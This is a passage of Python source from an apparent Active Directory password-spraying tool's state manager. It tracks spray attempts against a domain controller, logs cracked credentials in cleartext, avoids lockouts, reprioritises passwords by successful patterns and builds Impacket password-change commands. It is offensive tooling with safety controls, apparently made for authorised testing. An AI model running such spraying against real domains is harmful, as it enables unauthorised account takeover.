            "\n".join(password_change_sections),
        )

        locked_lines = sorted(self.locked_users)
        self._atomic_write_text(self.lockouts_file, "\n".join(locked_lines) + ("\n" if locked_lines else ""))

        self._atomic_write_text(self.used_file, "\n".join(self.used_passwords) + ("\n" if self.used_passwords else ""))

        # Export results if requested
        if self.cfg.export in ("json", "all"):
            self.export_results("json")
        if self.cfg.export in ("csv", "all"):
            self.export_results("csv")

    def _target_identity(self) -> Dict[str, Any]:
        """Stable fields that must match before a saved run can be resumed."""
        return {
            "domain": self.cfg.domain.casefold(),
            "dc_ip": self.cfg.dc_ip,
            "pth_mode": self.cfg.pth_mode,
        }

    def _input_identity(self) -> Dict[str, Any]:
        """Fingerprints and safety settings that must match on resume."""
        canonical_users = [canonical_identity(user, self.cfg.domain) for user in self.cfg.users]
        canonical_source_users = [
            canonical_identity(user, self.cfg.domain)
            for user in (self.cfg.source_users or self.cfg.users)
        ]
        safety = {
            "tool": self.cfg.tool,
            "protocol": self.cfg.protocol,
            "pth_mode": self.cfg.pth_mode,
            "minutes_between_batches": self.cfg.time_between_rounds,
            "passes_per_batch": self.cfg.passwords_per_round,
            "lockout_threshold": self.cfg.lockout_threshold,
            "lockout_burst": self.cfg.lockout_burst,
            "schedule": self.cfg.schedule,
            "filter_disabled": self.cfg.filter_disabled,
            "dry_run": self.cfg.dry_run,
            "engine_cooldown_rounds": self.cfg.engine_cooldown_rounds,
            "engine_transient_threshold": self.cfg.engine_transient_threshold,
            "engine_timeout_seconds": self.cfg.engine_timeout_seconds,
            "engine_idle_timeout_seconds": self.cfg.engine_idle_timeout_seconds,
            "realm_retry": self.cfg.realm_retry,
        }
        return {
            "source_users_sha256": _sha256_json(canonical_source_users),
            "users_sha256": _sha256_json(canonical_users),
            "secrets_sha256": _sha256_json(self.cfg.passwords),
            "safety_sha256": _sha256_json(safety),
        }

    def record_spray_start(self, engine: Engine, secret: str, round_idx: int):
        """Log spray start header."""
        self.current_round = round_idx
        ts = datetime.datetime.now().isoformat()
        masked = "***"
        self._log_line(f"=== {ts} SPRAY engine={engine} secret={masked} batch={round_idx} ===")
        # Feature E: Record timeline event
        self.record_timeline_event("spray", f"{engine} with masked secret", round_idx=round_idx)

    def record_spray_end(self, successes: int, lockouts: int, conn_fails: int, aborted: bool, abort_reason: str = "", errors: int = 0):
        """Log spray end trailer."""
        ts = datetime.datetime.now().isoformat()
        self._log_line(f"=== {ts} END successes={successes} lockouts={lockouts} conn_fails={conn_fails} errors={errors} aborted={aborted} reason={abort_reason} ===")
        self._log_line("")

    @property
    def credential_count(self) -> int:
        """Number of unique working user/secret pairs."""
        return len(self.credentials)

    def password_change_findings(self) -> List[Dict[str, Any]]:
        """Return valid credentials that require an operator password change."""
        return [
            finding
            for finding in self.credentials
            if finding.get("credential_state") in PASSWORD_CHANGE_PAIR_STATUSES
        ]

    def password_change_command(self, finding: Dict[str, Any]) -> str:
        """Return a prompt-safe Impacket command for one restricted credential."""
        return build_password_change_command(
            self.cfg.domain,
            str(finding["user"]),
            self.cfg.dc_ip,
            secret=str(finding["secret"]),
            pth_mode=self.cfg.pth_mode,
        )

    @property
    def lockout_count(self) -> int:
        """Safety-signal events retained for cumulative stop decisions."""
        if self.lockout_signals:
            return len(self.lockout_signals)
        return len(self.locked_users) + self.unknown_lockout_events

    def signal_identity_count(self, certainty: Optional[str] = None) -> int:
        """Count distinct known identities affected by retained safety signals."""
        return len({
            canonical_identity(str(event["user"]), self.cfg.domain)
            for event in self.lockout_signals
            if event.get("user")
            and (certainty is None or event.get("certainty") == certainty)
        })

    def credential_pairs(self) -> List[Tuple[str, str]]:
        return [(item["user"], item["secret"]) for item in self.credentials]

    def admin_credential_pairs(self) -> Set[Tuple[str, str]]:
        return {
            (item["user"], item["secret"])
            for item in self.credentials
            if item.get("is_admin")
        }

    def known_signal_users(self) -> Set[str]:
        users = {
            str(event["user"])
            for event in self.lockout_signals
            if event.get("user")
        }
        return users or set(self.locked_users)

    def signal_count_for_secret(self, secret: str) -> int:
        return sum(1 for event in self.lockout_signals if event.get("secret") == secret)

    def _display_user(self, user: str) -> str:
        key = canonical_identity(user, self.cfg.domain)
        configured = self._configured_by_key.get(key)
        if configured is not None:
            return configured
        configured = self._configured_by_alias.get(str(user).strip().casefold())
        return configured if configured is not None else str(user).strip()

    def _quarantine(self, user: str, reason: str) -> None:
        display = self._display_user(user)
        key = canonical_identity(display, self.cfg.domain)
        existing = self.quarantined_users.get(key)
        reasons = set(existing.get("reasons", [])) if existing else set()
        if existing and existing.get("reason"):
            reasons.add(str(existing["reason"]))
        reasons.add(reason)
        primary = min(
            reasons,
            key=lambda item: QUARANTINE_PRIORITY.get(item, 50),
        )
        self.quarantined_users[key] = {
            "user": str(existing.get("user", display)) if existing else display,
            "reason": primary,
            "reasons": sorted(reasons),
        }

    def quarantine_reason(self, user: str) -> Optional[str]:
        record = self.quarantined_users.get(canonical_identity(user, self.cfg.domain))
        return str(record.get("reason")) if record else None

    def quarantine_reasons(self, user: str) -> Set[str]:
        record = self.quarantined_users.get(canonical_identity(user, self.cfg.domain))
        if not record:
            return set()
        reasons = {
            str(reason)
            for reason in record.get("reasons", [])
            if isinstance(reason, str)
        }
        if record.get("reason"):
            reasons.add(str(record["reason"]))
        return reasons

    def _remove_quarantine_reason(self, user: str, reason: str) -> None:
        key = canonical_identity(user, self.cfg.domain)
        record = self.quarantined_users.get(key)
        if not record:
            return
        reasons = self.quarantine_reasons(user)
        reasons.discard(reason)
        if not reasons:
            del self.quarantined_users[key]
            return
        primary = min(
            reasons,
            key=lambda item: QUARANTINE_PRIORITY.get(item, 50),
        )
        record["reason"] = primary
        record["reasons"] = sorted(reasons)

    def add_cred(
        self,
        user: str,
        secret: str,
        is_admin: bool = False,
        source_round: Optional[int] = None,
        engine: str = "",
        persist: bool = True,
        credential_state: str = "valid",
    ) -> bool:
        """Record a unique working credential pair. Return True when newly added."""
        if credential_state not in CREDENTIAL_STATES:
            raise ValueError("credential finding has an invalid state")
        if is_admin and credential_state != "valid":
            raise ValueError("an admin finding cannot also require a password change")
        if secret not in self.cfg.passwords:
            raise ValueError("credential finding references an unconfigured secret")
        configured_keys = {
            canonical_identity(configured, self.cfg.domain)
            for configured in self.cfg.users
        }
        if canonical_identity(user, self.cfg.domain) not in configured_keys:
            raise ValueError("credential finding references an unconfigured identity")
        user = self._display_user(user)
        self.found_creds[user] = secret
        if is_admin:
            self.admin_users[user] = secret

        pair = (canonical_identity(user, self.cfg.domain), secret)
        existing = self._credential_index.get(pair)
        if existing:
            changed = False
            if is_admin and not existing.get("is_admin"):
                existing["is_admin"] = True
                changed = True
            if (
                credential_state in PASSWORD_CHANGE_PAIR_STATUSES
                and existing.get("credential_state") != credential_state
            ):
                existing["credential_state"] = credential_state
                changed = True
            if changed and persist:
                self.save()
            return False

        captured_at = datetime.datetime.now().isoformat()
        record = {
            "user": user,
            "secret": secret,
            "is_admin": is_admin,
            "credential_state": credential_state,
            "captured_at": captured_at,
            "source_round": source_round if source_round is not None else self.current_round,
            "source_pass": (
                self.current_pass
                or source_round
                or self.current_round
                or None
            ),
            "source_batch": self.current_round or source_round or None,
            "engine": engine,
        }
        self.credentials.append(record)
        self._credential_index[pair] = record
        self._quarantine(user, "credential_found")

        # Track pattern learning
        pattern = classify_password_pattern(secret)
        self.success_by_pattern[pattern] = self.success_by_pattern.get(pattern, 0) + 1

        # Feature E: Record timeline event before save
        if credential_state in PASSWORD_CHANGE_PAIR_STATUSES:
            self.record_timeline_event(
                "password_change_required",
                f"{user} ({credential_state_label(credential_state)})",
            )
        else:
            self.record_timeline_event("credential", f"{user} (pattern: {pattern})")

        self._log_line(
            f"{captured_at} CREDENTIAL {user}:{secret} admin={is_admin} "
            f"state={credential_state} pattern={pattern}"
        )
        if persist:
            self.save()
        return True

    def add_lockout(
        self,
        user: Optional[str],
        *,
        certainty: str = "definitive",
        engine: str = "",
        protocol: str = "",
        secret: Optional[str] = None,
        raw_line: str = "",
        stage: str = "spray",
        source_pass: Optional[int] = None,
        source_batch: Optional[int] = None,
        persist: bool = True,
    ) -> bool:
        """Record one definitive or ambiguous safety signal."""
        if certainty not in {"definitive", "ambiguous"}:
            raise ValueError(f"invalid safety-signal certainty: {certainty}")
        if stage not in {"spray", "identity_enumeration"}:
            raise ValueError(f"invalid safety-signal stage: {stage}")
        if stage == "spray" and secret not in self.cfg.passwords:
            raise ValueError("a spray safety signal must reference a configured secret")
        if stage == "identity_enumeration" and secret is not None:
            raise ValueError("an identity-enumeration signal cannot reference a secret")
        if user and user != "(unknown)" and (
            canonical_identity(user, self.cfg.domain) not in self._configured_by_key
        ):
            raise ValueError("safety signal references an unconfigured identity")
        ts = datetime.datetime.now().isoformat()
        definitive = certainty == "definitive"
        if not user or user == "(unknown)":
            self.unknown_lockout_events += 1
            self.lockout_signals.append({
                "ts": ts,
                "user": None,
                "certainty": certainty,
                "engine": engine,
                "protocol": protocol,
                "stage": stage,
                "secret": secret,
                "raw": raw_line,
                "source_pass": source_pass or self.current_pass or None,
                "source_batch": source_batch or self.current_round or None,
            })
            self.record_timeline_event("lockout", f"unknown user ({certainty})")
            self._log_line(
                f"{ts} LOCKOUT-SIGNAL unknown-user certainty={certainty} stage={stage}"
            )
            if persist:
                self.save()
            return True

        user = self._display_user(user)
        key = canonical_identity(user, self.cfg.domain)
        if any(
            canonical_identity(str(event.get("user", "")), self.cfg.domain) == key
            and event.get("certainty") == certainty
            for event in self.lockout_signals
            if event.get("user")
        ):
            if definitive:
                self.locked_users.add(user)
                self._quarantine(user, "confirmed_lockout")
            else:
                self._quarantine(user, "ambiguous_lockout_signal")
            return False

        if definitive:
            self.locked_users.add(user)
            self._quarantine(user, "confirmed_lockout")
        else:
            self._quarantine(user, "ambiguous_lockout_signal")

        self.lockout_signals.append({
            "ts": ts,
            "user": user,
            "certainty": certainty,
            "engine": engine,
            "protocol": protocol,
            "stage": stage,
            "secret": secret,
            "raw": raw_line,
            "source_pass": source_pass or self.current_pass or None,
            "source_batch": source_batch or self.current_round or None,
        })

        # Feature E: Record timeline event before save
        self.record_timeline_event("lockout", f"{user} ({certainty})")

        self._log_line(
            f"{ts} LOCKOUT-SIGNAL {user} certainty={certainty} stage={stage}"
        )
        if persist:
            self.save()
        return True

    def mark_used(self, secret: str):
        """Mark a password/hash as used."""
        if secret not in self.cfg.passwords:
            raise ValueError("cannot complete an unconfigured secret")
        ledger = self.pair_ledger.get(secret, {})
        for user in self.cfg.users:
            key = canonical_identity(user, self.cfg.domain)
            record = ledger.get(key)
            if record is not None and record.get("status") not in TERMINAL_PAIR_STATUSES:
                raise RuntimeError(
                    f"cannot complete a pass while {user} is still in flight"
                )
            if record is None and key not in self.quarantined_users:
                raise RuntimeError(
                    "cannot complete a pass without an outcome or quarantine "
                    f"decision for {user}"
                )
        if secret not in self.used_passwords:
            self.used_passwords.append(secret)
        try:
            self.remaining_queue.remove(secret)
        except ValueError:
            pass
        self.save()

    def mark_round_complete(self):
        """Record one completed batch and its delay anchor."""
        if self.remaining_queue:
            progress = self.current_batch_progress()
            if progress != self.cfg.passwords_per_round:
                raise RuntimeError(
                    "cannot complete a batch before all of its pass slots are used"
                )
        self.completed_rounds += 1
        self.last_batch_completed_at = datetime.datetime.now().isoformat()
        self.save()

    def current_batch_progress(self) -> int:
        """Return completed passes in the active, not-yet-completed batch."""
        if not self.remaining_queue:
            return 0
        progress = (
            len(self.used_passwords)
            - (self.completed_rounds * self.cfg.passwords_per_round)
        )
        if not 0 <= progress <= self.cfg.passwords_per_round:
            raise RuntimeError(
                "saved batch progress is inconsistent with used secrets; refusing to spray"
            )
        return progress

    @staticmethod
    def _atomic_write_text(path: Path, content: str):
        """Atomically replace a UTF-8 text file, retaining the old file on a crash."""
        fd, tmp_name = tempfile.mkstemp(prefix=f".{path.name}.", suffix=".tmp", dir=path.parent)
        tmp_path = Path(tmp_name)
        try:
            os.fchmod(fd, 0o600)
            with os.fdopen(fd, "w", encoding="utf-8") as handle:
                fd = -1
                handle.write(content)
                handle.flush()
                os.fsync(handle.fileno())
            os.replace(tmp_path, path)
            os.chmod(path, 0o600)
        finally:
            if fd >= 0:
                os.close(fd)
            try:
                tmp_path.unlink()
            except FileNotFoundError:
                pass

    def _log_line(self, line: str):
        """Append a line to the overall log."""
        fd = os.open(self.overall_log, os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)
        os.fchmod(fd, 0o600)
        with os.fdopen(fd, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    # =============================================================================
    # Feature 1: Credential-reuse matrix methods
    # =============================================================================

    def pair_status(self, secret: str, user: str) -> Optional[str]:
        key = canonical_identity(user, self.cfg.domain)
        record = self.pair_ledger.get(secret, {}).get(key)
        return str(record.get("status")) if record else None

    def begin_attempt(self, secret: str, user: str, engine: Engine) -> bool:
        """Persist an in-flight pair before launching its engine process."""
        if secret not in self.cfg.passwords:
            raise ValueError("attempt references an unconfigured secret")
        if canonical_identity(user, self.cfg.domain) not in self._configured_by_key:
            raise ValueError("attempt references an unconfigured identity")
        user = self._display_user(user)
        key = canonical_identity(user, self.cfg.domain)
        ledger = self.pair_ledger.setdefault(secret, {})
        existing = ledger.get(key)
        if existing:
            status = str(existing.get("status", "indeterminate"))
            retryable = status == "indeterminate" and self.cfg.retry_indeterminate
            if not retryable:
                return False
            dispatch_count = int(existing.get("dispatch_count", 1)) + 1
            previous_status = status
        else:
            dispatch_count = 1
            previous_status = ""

        now = datetime.datetime.now().isoformat()
        ledger[key] = {
            "user": user,
            "status": "in_flight",
            "engine": str(engine),
            "protocol": engine.protocol or "",
            "started_at": now,
            "updated_at": now,
            "dispatch_count": dispatch_count,
            "source_pass": self.current_pass or None,
            "source_batch": self.current_round or None,
            "previous_status": previous_status,
            "detail": "",
        }
        self.total_attempts += 1
        self.total_dispatches += 1
        self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + 1
        self.save()
        return True

    def finish_attempt(
        self,
        secret: str,
        user: str,
        status: str,
        detail: str = "",
        *,
        persist: bool = True,
    ) -> None:
        """Persist a terminal outcome for the currently in-flight pair."""
        if status not in TERMINAL_PAIR_STATUSES:
            raise ValueError(f"invalid terminal pair status: {status}")
        if secret not in self.cfg.passwords:
            raise ValueError("terminal outcome references an unconfigured secret")
        if canonical_identity(user, self.cfg.domain) not in self._configured_by_key:
            raise ValueError("terminal outcome references an unconfigured identity")
        user = self._display_user(user)
        key = canonical_identity(user, self.cfg.domain)
        ledger = self.pair_ledger.setdefault(secret, {})
        record = ledger.get(key)
        if record is None:
            # Compatibility for direct parser/state use outside the strict runner.
            now = datetime.datetime.now().isoformat()
            record = {
                "user": user,
                "status": "in_flight",
                "engine": "",
                "protocol": "",
                "started_at": now,
                "updated_at": now,
                "dispatch_count": 1,
                "previous_status": "",
                "detail": "",
            }
            ledger[key] = record
            self.total_attempts += 1
            self.total_dispatches += 1
            self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + 1
        elif record.get("status") != "in_flight":
            return

        record["status"] = status
        record["updated_at"] = datetime.datetime.now().isoformat()
        record["detail"] = detail
        record.pop("previous_status", None)
        self.attempted_matrix.setdefault(secret, set()).add(user)
        if status == "indeterminate":
            self._quarantine(user, "indeterminate")
        else:
            has_other_indeterminate = any(
                other.get(key, {}).get("status") in {"in_flight", "indeterminate"}
                for other_secret, other in self.pair_ledger.items()
                if other_secret != secret
            )
            if not has_other_indeterminate:
                self._remove_quarantine_reason(user, "indeterminate")
        if persist:
            self.save()

    def cancel_attempt(self, secret: str, user: str) -> None:
        """Undo an in-flight dispatch proven not to have reached authentication."""
        key = canonical_identity(user, self.cfg.domain)
        ledger = self.pair_ledger.get(secret, {})
        record = ledger.get(key)
        if not record or record.get("status") != "in_flight":
            return
        previous_status = str(record.get("previous_status", ""))
        self.total_attempts = max(0, self.total_attempts - 1)
        self.total_dispatches = max(0, self.total_dispatches - 1)
        current = self.attempts_by_password.get(secret, 0)
        if current <= 1:
            self.attempts_by_password.pop(secret, None)
        else:
            self.attempts_by_password[secret] = current - 1
        if previous_status:
            record["status"] = previous_status
            record["updated_at"] = datetime.datetime.now().isoformat()
            record["dispatch_count"] = max(
                1,
                int(record.get("dispatch_count", 1)) - 1,
            )
            record.pop("previous_status", None)
        else:
            del ledger[key]
            if not ledger:
                self.pair_ledger.pop(secret, None)
        self.save()

    def reconcile_ledger_metrics(self) -> None:
        """Rebuild attempt counters from the authoritative pair ledger."""
        attempts_by_secret: Dict[str, int] = {}
        for secret, records in self.pair_ledger.items():
            dispatches = sum(
                max(0, int(record.get("dispatch_count", 0)))
                for record in records.values()
                if isinstance(record, dict)
            )
            if dispatches:
                attempts_by_secret[secret] = dispatches
        self.attempts_by_password = attempts_by_secret
        self.total_attempts = sum(attempts_by_secret.values())
        self.total_dispatches = self.total_attempts

    def pair_status_counts(self) -> Dict[str, int]:
        """Return current pair outcomes derived from the ledger."""
        counts: Dict[str, int] = {}
        for records in self.pair_ledger.values():
            for record in records.values():
                status = str(record.get("status", "indeterminate"))
                counts[status] = counts.get(status, 0) + 1
        return counts

    def credential_pair_count(self) -> int:
        """Return unique identity/secret pairs represented in the ledger."""
        return sum(len(records) for records in self.pair_ledger.values())

    def successful_pair_count(self) -> int:
        """Return final pair outcomes that proved a valid credential."""
        counts = self.pair_status_counts()
        return sum(counts.get(status, 0) for status in SUCCESS_PAIR_STATUSES)

    def password_change_pair_count(self) -> int:
        """Return valid pairs whose account requires a password change."""
        counts = self.pair_status_counts()
        return sum(
            counts.get(status, 0)
            for status in PASSWORD_CHANGE_PAIR_STATUSES
        )

    def real_pair_outcome_count(self) -> int:
        """Return non-simulated pair outcomes used as the success-rate base."""
        counts = self.pair_status_counts()
        return sum(
            count
            for status, count in counts.items()
            if status not in {"dry_run", "legacy_attempted"}
        )

    def pair_success_rate(self) -> Optional[float]:
        """Return final pair success percentage, excluding simulated pairs."""
        denominator = self.real_pair_outcome_count()
        if denominator == 0:
            return None
        return (self.successful_pair_count() / denominator) * 100

    def skipped_pair_count(self) -> int:
        """Count undispatched pairs omitted from passes already completed."""
        skipped = 0
        for secret in self.used_passwords:
            ledger = self.pair_ledger.get(secret, {})
            for user in self.cfg.users:
                if canonical_identity(user, self.cfg.domain) not in ledger:
                    skipped += 1
        return skipped

    def mark_attempted(self, secret: str, user: str, status: str = "auth_failure"):
        """Compatibility helper for recording a terminal pair exactly once."""
        existing = self.pair_status(secret, user)
        if existing in TERMINAL_PAIR_STATUSES:
            return
        if existing != "in_flight":
            self.begin_attempt(secret, user, Engine("internal"))
        self.finish_attempt(secret, user, status)

    def mark_attempted_batch(self, secret: str, users: List[str], status: str = "dry_run"):
        """Record a deterministic batch, primarily for dry-run compatibility."""
        for user in users:
            self.mark_attempted(secret, user, status=status)

    def eligible_users_for(self, secret: str) -> List[str]:
        """Return identities safe to dispatch for this secret."""
        legacy_attempted = {
            canonical_identity(user, self.cfg.domain)
            for user in self.attempted_matrix.get(secret, set())
        }
        ledger = self.pair_ledger.get(secret, {})
        eligible: List[str] = []
        for user in self.cfg.users:
            key = canonical_identity(user, self.cfg.domain)
            reasons = self.quarantine_reasons(user)
            if "confirmed_lockout" in reasons:
                continue
            if "ambiguous_lockout_signal" in reasons:
                continue
            if "credential_found" in reasons and not self.cfg.retry_compromised:
                continue
            if "indeterminate" in reasons and not self.cfg.retry_indeterminate:
                continue

            record = ledger.get(key)
            if record:
                status = str(record.get("status", "indeterminate"))
                if status == "indeterminate" and self.cfg.retry_indeterminate:
                    eligible.append(user)
                continue
            if key in legacy_attempted:
                continue
            eligible.append(user)
        return eligible

    def write_userlist(self, users: List[str]) -> str:
        """Create a private unpredictable engine input file."""
        fd, name = tempfile.mkstemp(prefix=".users-", suffix=".txt", dir=self.log_dir)
        try:
            os.fchmod(fd, 0o600)
            with os.fdopen(fd, "w", encoding="utf-8") as handle:
                fd = -1
                handle.write("\n".join(users) + "\n")
                handle.flush()
                os.fsync(handle.fileno())
        finally:
            if fd >= 0:
                os.close(fd)
        return name

    def build_userlist_for(self, secret: str) -> Tuple[str, int]:
        """
        Build a filtered userlist for a specific password.
        Returns (temp_file_path, count_of_users_not_yet_attempted).
        """
        remaining_users = self.eligible_users_for(secret)

        if not remaining_users:
            return ("", 0)

        return (self.write_userlist(remaining_users), len(remaining_users))

    # =============================================================================
    # Feature 3: Pattern learning methods
    # =============================================================================

    def reprioritize_queue(self) -> int:
        """
        Reorder remaining_queue by successful-pattern score (stable sort).
        Returns number of passwords that got boosted (score > 0).
        """
        if not self.success_by_pattern:
            return 0  # No successes yet, no re-prioritization

        def score(pw):
            return self.success_by_pattern.get(classify_password_pattern(pw), 0)

        before = list(self.remaining_queue)

        # Python sort is stable → equal-score passwords keep relative order
        self.remaining_queue.sort(key=score, reverse=True)

        boosted = sum(1 for pw in self.remaining_queue if score(pw) > 0)
        return boosted if self.remaining_queue != before else 0

    # =============================================================================
    # Feature 4: Spray statistics
    # =============================================================================

    def render_stats(self, console: Console) -> Table:
        """Render spray statistics as a rich Table."""
        self.reconcile_ledger_metrics()
        status_counts = self.pair_status_counts()
        table = Table(title=f"{PRODUCT_NAME} Run Statistics", box=box.SQUARE)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")

        # Calculate elapsed time
        start_dt = datetime.datetime.fromisoformat(self.start_time)
        elapsed = datetime.datetime.now() - start_dt
        elapsed_str = str(elapsed).split(".")[0]  # Remove microseconds

        pair_count = self.credential_pair_count()
        successful_pairs = self.successful_pair_count()
        password_changes = self.password_change_pair_count()
        success_rate = self.pair_success_rate()

        table.add_row("Started", self.start_time)
        table.add_row("Elapsed time", elapsed_str)
        table.add_row("Authentication attempts sent", str(self.total_dispatches))
        table.add_row("Unique credential pairs", str(pair_count))
        table.add_row("Valid credentials", str(successful_pairs))
        table.add_row("Need password change", str(password_changes))
        table.add_row("Authentication failures", str(status_counts.get("auth_failure", 0)))
        table.add_row(
            "Safety-result pairs",
            str(
                status_counts.get("lockout", 0)
                + status_counts.get("ambiguous_lockout", 0)
            ),
        )
        table.add_row("Uncertain pairs", str(status_counts.get("indeterminate", 0)))
        table.add_row("Simulated pairs", str(status_counts.get("dry_run", 0)))
        table.add_row("Skipped pairs", str(self.skipped_pair_count()))
        table.add_row(
            "Pair success rate",
            f"{success_rate:.2f}%" if success_rate is not None else "N/A",
        )
        lockout_value = str(self.lockout_count)
        if self.unknown_lockout_events:
            lockout_value += f" ({self.unknown_lockout_events} unknown-user signal(s))"
        table.add_row("Safety-signal events", lockout_value)
        table.add_row("Affected identities", str(self.signal_identity_count()))
        table.add_row("Confirmed locked identities", str(len(self.locked_users)))
        table.add_row(
            "Ambiguous-signal identities",
            str(self.signal_identity_count("ambiguous")),
        )
        table.add_row("Batches completed", str(self.completed_rounds))

        # Top 5 attempts by password
        if self.attempts_by_password:
            top_attempts = sorted(self.attempts_by_password.items(), key=lambda x: x[1], reverse=True)[:5]
            table.add_row("", "")
            table.add_row("[bold]Top passwords by attempts[/bold]", "")
            for pw, count in top_attempts:
                pw_display = pw[:30] + "..." if len(pw) > 30 else pw
                table.add_row(f"  {pw_display}", str(count))

        # Success by pattern
        if self.success_by_pattern:
            table.add_row("", "")
            table.add_row("[bold]Success by pattern[/bold]", "")
            sorted_patterns = sorted(self.success_by_pattern.items(), key=lambda x: x[1], reverse=True)
            for pattern, count in sorted_patterns:
                table.add_row(f"  {pattern}", str(count))

        # Credential reuse (Feature C)
        reused = self.detect_cred_reuse()
        if reused:
            table.add_row("", "")
            table.add_row("[bold]Credential reuse[/bold]", "")
            for pw, users in reused[:5]:  # Top 5
                pw_display = pw[:20] + "..." if len(pw) > 20 else pw
                users_str = ", ".join(users[:5])
                if len(users) > 5:
                    users_str += f" (+{len(users) - 5} more)"
                table.add_row(f"  {pw_display} ({len(users)} users)", users_str)

        return table

    def get_compact_stats(self) -> str:
        """Return compact one-line stats string for a batch summary."""
        self.reconcile_ledger_metrics()
        status_counts = self.pair_status_counts()
        parts = [
            f"Attempts sent: {self.total_dispatches}",
            f"Unique pairs: {self.credential_pair_count()}",
            f"Valid: {self.successful_pair_count()}",
        ]
        password_changes = self.password_change_pair_count()
        if password_changes:
            parts.append(f"Change needed: {password_changes}")
        parts.extend([
            f"Failed: {status_counts.get('auth_failure', 0)}",
            "Safety: "
            f"{status_counts.get('lockout', 0) + status_counts.get('ambiguous_lockout', 0)}",
            f"Uncertain: {status_counts.get('indeterminate', 0)}",
        ])
        simulated = status_counts.get("dry_run", 0)
        if simulated:
            parts.append(f"Simulated: {simulated}")
        parts.append(f"Skipped: {self.skipped_pair_count()}")
        return " | ".join(parts)

    # =============================================================================
    # Feature 5: JSON/CSV export
    # =============================================================================

    def export_results(self, fmt: str):
        """Export results to JSON or CSV."""
        if fmt == "json":
            self._export_json()
        elif fmt == "csv":
            self._export_csv()

    def pair_results(self) -> List[Dict[str, Any]]:
        """Return one deterministic report row for every recorded credential pair."""
        findings = {
            (canonical_identity(str(item["user"]), self.cfg.domain), str(item["secret"])): item
            for item in self.credentials
        }
        rows: List[Dict[str, Any]] = []
        emitted: Set[Tuple[str, str]] = set()

        for secret in self.cfg.passwords:
            ledger = self.pair_ledger.get(secret, {})
            for configured_user in self.cfg.users:
                key = canonical_identity(configured_user, self.cfg.domain)
                record = ledger.get(key)
                if record is None:
                    continue
                finding = findings.get((key, secret))
                status = str(record.get("status", "indeterminate"))
                credential_state = ""
                if finding is not None:
                    credential_state = str(
                        finding.get("credential_state", "valid")
                    )
                elif status in PASSWORD_CHANGE_PAIR_STATUSES:
                    credential_state = status
                elif status in SUCCESS_PAIR_STATUSES:
                    credential_state = "valid"
                is_admin = bool(
                    (finding and finding.get("is_admin"))
                    or status == "admin_success"
                )
                rows.append({
                    "user": str(record.get("user") or configured_user),
                    "secret": secret,
                    "status": status,
                    "is_admin": is_admin,
                    "credential_state": credential_state,
                    "source_pass": record.get("source_pass") or "",
                    "source_batch": record.get("source_batch") or "",
                    "engine": str(record.get("engine", "")),
                    "protocol": str(record.get("protocol", "")),
                    "dispatch_count": int(record.get("dispatch_count", 0)),
                    "started_at": str(record.get("started_at", "")),
                    "completed_at": str(record.get("updated_at", "")),
                    "detail": str(record.get("detail", "")),
                    "password_change_command": (
                        self.password_change_command(finding)
                        if finding is not None
                        and credential_state in PASSWORD_CHANGE_PAIR_STATUSES
                        else ""
                    ),
                })
                emitted.add((key, secret))

        # Direct API consumers can add a finding without constructing a ledger
        # entry. Preserve that finding in reports while clearly leaving its
        # dispatch-specific fields empty.
        for finding in self.credentials:
            user = str(finding["user"])
            secret = str(finding["secret"])
            key = canonical_identity(user, self.cfg.domain)
            if (key, secret) in emitted:
                continue
            credential_state = str(finding.get("credential_state", "valid"))
            is_admin = bool(finding.get("is_admin"))
            engine = str(finding.get("engine", ""))
            protocol = engine.split(":", 1)[1] if ":" in engine else ""
            rows.append({
                "user": user,
                "secret": secret,
                "status": (
                    credential_state
                    if credential_state in PASSWORD_CHANGE_PAIR_STATUSES
                    else "admin_success" if is_admin else "success"
                ),
                "is_admin": is_admin,
                "credential_state": credential_state,
                "source_pass": (
                    finding.get("source_pass")
                    or finding.get("source_round")
                    or ""
                ),
                "source_batch": (
                    finding.get("source_batch")
                    or finding.get("source_round")
                    or ""
                ),
                "engine": engine,
                "protocol": protocol,
                "dispatch_count": "",
                "started_at": "",
                "completed_at": str(finding.get("captured_at", "")),
                "detail": "finding recorded without a pair-ledger entry",
                "password_change_command": (
                    self.password_change_command(finding)
                    if credential_state in PASSWORD_CHANGE_PAIR_STATUSES
                    else ""
                ),
            })

        return rows

    def _export_json(self):
        """Export results to results.json."""
        self.reconcile_ledger_metrics()
        status_counts = self.pair_status_counts()
        success_rate = self.pair_success_rate()
        exported_credentials: List[Dict[str, Any]] = []
        for finding in self.credentials:
            exported = dict(finding)
            if finding.get("credential_state") in PASSWORD_CHANGE_PAIR_STATUSES:
                exported["password_change_command"] = self.password_change_command(
                    finding
                )
            exported_credentials.append(exported)
        results = {
            "started": self.start_time,
            "config": {
                "domain": self.cfg.domain,
                "dc_ip": self.cfg.dc_ip,
                "tool": self.cfg.tool,
                "protocol": self.cfg.protocol,
                "pth": self.cfg.pth_mode,
            },
            "stats": {
                "total_attempts": self.total_attempts,
                "authentication_dispatches": self.total_dispatches,
                "unique_credential_pairs": self.credential_pair_count(),
                "credentials_found": self.credential_count,
                "successful_pairs": self.successful_pair_count(),
                "password_change_required": self.password_change_pair_count(),
                "authentication_failures": status_counts.get("auth_failure", 0),
                "indeterminate_pairs": status_counts.get("indeterminate", 0),
                "simulated_pairs": status_counts.get("dry_run", 0),
                "skipped_pairs": self.skipped_pair_count(),
                "pair_success_rate_percent": success_rate,
                "pair_statuses": status_counts,
                "lockout_signals": self.lockout_count,
                "affected_signal_identities": self.signal_identity_count(),
                "confirmed_locked_identities": len(self.locked_users),
                "ambiguous_signal_identities": self.signal_identity_count("ambiguous"),
                "unknown_lockout_signals": self.unknown_lockout_events,
                "batches_completed": self.completed_rounds,
                "success_by_pattern": self.success_by_pattern,
            },
            "found_creds": self.found_creds,
            "credentials": exported_credentials,
            "pair_results": self.pair_results(),
            "cred_reuse": [{"password": pw, "users": users} for pw, users in self.detect_cred_reuse()],
            "admin_users": self.admin_users,
            "locked_users": list(self.locked_users),
            "attempted_pairs": self.credential_pair_count(),
        }

        json_path = self.log_dir / "results.json"
        self._atomic_write_text(json_path, json.dumps(results, indent=2) + "\n")

    def _export_csv(self):
        """Export every final pair outcome to results.csv."""
        def safe_cell(value: Any) -> Any:
            if not isinstance(value, str):
                return value
            formula_candidate = value.lstrip(" \t\r\n")
            if (
                value.startswith(("\t", "\r"))
